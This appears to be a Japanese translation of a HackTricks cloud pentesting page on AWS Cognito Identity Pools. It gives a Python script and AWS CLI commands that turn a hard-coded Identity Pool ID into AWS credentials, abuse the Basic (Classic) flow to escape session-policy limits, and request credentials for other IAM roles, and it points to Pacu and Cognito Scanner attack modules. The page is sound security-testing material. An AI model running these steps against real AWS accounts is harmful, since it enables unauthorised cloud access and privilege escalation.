# Cognito Identity Pools

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**する。
- **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>

## 基本情報

Identity poolsは、ユーザーが**一時的な資格情報を取得**できるようにすることで、重要な役割を果たします。これらの資格情報は、Amazon S3やDynamoDBなどのさまざまなAWSサービスにアクセスするために必要です。Identity poolsの注目すべき機能の1つは、匿名のゲストユーザーと、ユーザー認証のためのさまざまなアイデンティティプロバイダーの両方をサポートしていることです。サポートされているアイデンティティプロバイダーには、次のものが含まれます：

- Amazon Cognitoユーザープール
- Facebook、Google、Login with Amazon、Sign in with Appleなどのソーシャルサインインオプション
- OpenID Connect（OIDC）に準拠したプロバイダー
- SAML（Security Assertion Markup Language）アイデンティティプロバイダー
- 開発者による認証されたアイデンティティ
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Identity Poolセッションを生成するには、まず**Identity IDを生成する必要があります**。このIdentity IDは**そのユーザーのセッションの識別子**です。これらの識別子には、最大20のデータセットを持たせることができ、1MBのキーと値のペアを保存できます。

これは、**ユーザーの情報を保持するのに便利**です（常に同じIdentity IDを使用するユーザー）。

さらに、サービス**cognito-sync**は、この情報を**管理および同期する**ためのサービスです（データセット内で情報を送信し、ストリームやSNSメッセージに情報を送信する）。

### ペンテストツール

* [Pacu](https://github.com/RhinoSecurityLabs/pacu)、AWSの脆弱性検出フレームワークには、現在、アカウント内のすべてのCognitoアセットの列挙を自動化し、弱い構成、アクセス制御に使用されるユーザー属性などをフラグ付けし、変更可能なカスタム属性に基づいてユーザーの作成（MFAサポートを含む）および特権昇格を自動化する「cognito\_\_enum」と「cognito\_\_attack」モジュールが含まれています。使用可能なIdentity Pool資格情報、IDトークン内の仮定可能なロールなど。

モジュールの機能の説明については、[ブログ記事](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)の第2部を参照してください。インストール手順については、[Pacu](https://github.com/RhinoSecurityLabs/pacu)のメインページを参照してください。

#### 使用方法

指定されたIdentity Poolとユーザープールクライアントに対してユーザーの作成とすべての特権昇格ベクトルを試行するためのcognito\_\_attackの使用例：
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
以下は、現在のAWSアカウントで表示されるすべてのユーザープール、ユーザープールクライアント、アイデンティティプール、ユーザーなどを収集するためのcognito\_\_enumのサンプル使用方法です：
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) は、Cognito 上でのさまざまな攻撃、不要なアカウント作成、およびアイデンティティプールのエスカレーションを実装する Python の CLI ツールです。

#### インストール
```bash
$ pip install cognito-scanner
```
#### 使用法
```bash
$ cognito-scanner --help
```
For more information check https://github.com/padok-team/cognito-scanner

## IAMロールへのアクセス

### 認証されていない

Cognitoアプリで**AWS資格情報を取得**するために攻撃者が必要とする唯一の情報は**Identity Pool ID**であり、この**IDはWeb / モバイルアプリケーションにハードコードされている必要があります**。IDは次のように見えます：`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`（ブルートフォースできません）。

{% hint style="success" %}
**IAM Cognito未認証ロールは**デフォルトで`Cognito_<Identity Pool name>Unauth_Role`と呼ばれます。
{% endhint %}

ハードコードされたIdentity Pools IDを見つけ、認証されていないユーザーが許可されている場合、次の手順でAWS資格情報を取得できます：
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
または、次の**aws cliコマンド**を使用できます：
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
デフォルトでは、未認証のCognitoユーザーは、ポリシーを介して割り当てられていても、**権限を持つことはできません**。以下のセクションを確認してください。
{% endhint %}

### 強化認証フローと基本認証フロー

前のセクションでは、**デフォルトの強化認証フロー**に従いました。このフローは、生成されたIAMロールセッションに**制限がある**[**セッションポリシー**](../../aws-basic-information/#session-policies)を設定します。このポリシーは、セッションが[**このリストからのサービスのみを使用できるようにします**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)（ロールが他のサービスにアクセス権を持っていても）。

ただし、**Identity poolに「Basic (Classic) Flow」が有効になっている場合**、ユーザーはそのフローを使用してセッションを取得でき、そのセッションには**その制限のあるセッションポリシーが適用されません**。

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
この**エラー**を受け取った場合、**基本フローが有効になっていない（デフォルト）**ためです。

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAM資格情報を持っている場合は、[どのアクセス権限を持っているか](../../#whoami)を確認し、[特権を昇格](../../aws-privilege-escalation/)してみてください。

### 認証済み

{% hint style="info" %}
**認証済みユーザー**はおそらく**異なる権限**が付与されるため、**アプリ内でサインアップ**できる場合は、それを試して新しい資格情報を取得してください。
{% endhint %}

**認証済みユーザーがアクセスするIdentity Pool**には**ロール**も利用可能かもしれません。

そのためには**アイデンティティプロバイダー**へのアクセスが必要です。もし**Cognitoユーザープール**であれば、デフォルトの動作を悪用して**新しいユーザーを作成**することができるかもしれません。

{% hint style="success" %}
**IAM Cognito認証ロールは**デフォルトで`Cognito_<Identity Pool name>Auth_Role`と呼ばれます。
{% endhint %}

とにかく、**次の例**では、すでに**Cognitoユーザープール**にログインしてIdentity Poolにアクセスしていることを想定しています（他のタイプのアイデンティティプロバイダーも構成されている可能性があることを忘れないでください）。

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# 前のコマンドの応答からidentity_idを取得
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# IdTokenには、ユーザープールグループのためにユーザーがアクセスできるロールが含まれています
# 特定のロールに対して資格情報を取得するには--custom-role-arnを使用します
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
**ユーザーがログインしているアイデンティティプロバイダーによって異なるIAMロールを設定**することが可能です。また、クレームを使用して**ユーザーによっても異なるIAMロール**を設定することも可能です。したがって、同じまたは異なるプロバイダーを介して異なるユーザーにアクセス権がある場合は、**すべてのユーザーのIAMロールにログインしてアクセスする価値があるかもしれません**。
{% endhint %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>でAWSハッキングをゼロからヒーローまで学ぶ</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つけてください
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローしてください
* **ハッキングトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください

</details>
